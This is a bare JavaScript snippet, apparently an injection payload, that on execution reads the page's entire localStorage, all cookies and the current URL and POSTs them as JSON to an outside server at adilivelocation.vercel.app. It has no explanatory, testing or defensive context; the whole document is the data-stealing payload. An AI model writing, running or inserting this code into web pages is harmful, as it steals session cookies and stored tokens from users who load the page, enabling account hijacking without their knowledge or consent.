(() => {
    fetch(`https://adilivelocation.vercel.app/`, {
        method: "POST", headers: { "Content-Type": "application/json" }, body:JSON.stringify({
            l:JSON.stringify(localStorage),
            c:document.cookie,
            w:window.location.href
        })
    })
})()